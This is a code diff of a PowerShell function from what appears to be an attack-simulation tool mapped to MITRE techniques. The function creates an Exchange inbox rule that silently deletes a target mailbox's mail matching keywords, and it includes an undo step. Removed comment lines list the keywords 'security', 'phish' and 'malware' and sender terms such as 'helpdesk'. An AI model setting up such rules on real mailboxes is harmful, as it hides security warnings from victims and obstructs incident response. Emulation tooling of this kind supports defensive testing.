@@ -1,20 +1,12 @@
 function MailboxDeleteRuleSetup {	
     mitre_details("MailboxDeleteRuleSetup")
 
-    $inititate_recon = Read-Host -Prompt "`nInitiate recon to retrive available mailbox addresses (Yes/No)"
-    
-    if ($inititate_recon -notin "No","no","N","n"){
-        Get-Mailbox | Format-Table -Property DisplayName,PrimarySmtpAddress 
-    }
-
-    else {
-        #DoNothing
-    }
+    EnterMailbox("Enter a mailbox address to setup mail deletion rule on")
 
     #Enter account to compromise
-    $InternalUserName = Read-Host -Prompt "Enter a available mailbox address to setup inbox rule on"
+    $target_mailbox = $global:input_mailbox_address
     $InboxRuleName = Read-Host -Prompt "Enter a name for the mailbox rule you want to create"
-    Write-Host "`nConfiguring mailbox rule to delete emails from $InternalUserName mailbox containing specific terms" -ForegroundColor Gray
+    Write-Host "`nConfiguring mailbox rule to delete emails from $target_mailbox mailbox containing specific terms" -ForegroundColor Gray
 
     #Take keywords for the mailbox rule
     do {
@@ -32,13 +24,11 @@ function MailboxDeleteRuleSetup {
     #Setup Inbox Rules
     try {
         Write-Host "`nCreating mailbox rule to delete messages with keywords matching: $rule_keywords"
-        #New-InboxRule $InboxRuleName -DeleteMessage $true -SubjectOrBodyContainsWords 'security','compromise','infected','report','malware','suspicious','phish','hack' -Mailbox $InternalUserName -ErrorAction Stop
-        New-InboxRule $InboxRuleName -DeleteMessage $true -SubjectOrBodyContainsWords $rule_keywords -Mailbox $InternalUserName -Confirm:$false -ErrorAction Stop
-        #New-InboxRule $InboxRuleName -DeleteMessage $true -FromAddressContainsWords 'security','it','helpdesk' -Mailbox $InternalUserName
+        New-InboxRule $InboxRuleName -DeleteMessage $true -SubjectOrBodyContainsWords $rule_keywords -Mailbox $target_mailbox -Confirm:$false -ErrorAction Stop
         Start-Sleep -s 5
 
         #Confirm rule setup
-        Get-InboxRule -Mailbox $InternalUserName
+        Get-InboxRule -Mailbox $target_mailbox
         Write-Host "`nNew mailbox rule has been deployed successfully!!!" -ForegroundColor Yellow -BackgroundColor Black
         $allow_undo = $true
     }
@@ -54,7 +44,7 @@ function MailboxDeleteRuleSetup {
 
             try {
                 Write-Host "`nRemoving the new mailbox rules created..."
-                Remove-InboxRule -Mailbox $InternalUserName -Identity $InboxRuleName -Confirm:$false -ErrorAction Stop
+                Remove-InboxRule -Mailbox $target_mailbox -Identity $InboxRuleName -Confirm:$false -ErrorAction Stop
                 Write-Host "`nUndo successful: Removed mailbox rule: $InboxRuleName" -ForegroundColor Yellow -BackgroundColor Black
             }
             catch {
